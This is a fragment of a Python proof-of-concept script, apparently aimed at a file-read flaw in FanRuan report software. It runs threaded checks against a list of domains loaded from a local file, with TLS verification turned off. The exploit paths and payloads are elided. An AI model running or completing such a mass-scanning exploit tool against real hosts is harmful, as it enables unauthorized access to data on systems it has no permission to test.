...
def POC_1(target_url):
    ...
    try:
        ...
        response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers, proxies=proxies)
        response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers, proxies=proxies)
...
def POC_2(vuln_url_fileread):
    ...
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=5, headers=headers, proxies=proxies)
...
#domain格式为http://127.0.0.1:666或https://127.0.0.1:666
    with open("D:\\code\\python\\exp\\帆软报表\\domain.txt", encoding="utf-8") as f:
        for i in f.readlines():
            # print(i.strip("\n"))
            if len(enumerate()) < 100:
                Thread(target=POC_1, args=(i.strip("\n"),)).start()
            else:
                time.sleep(1)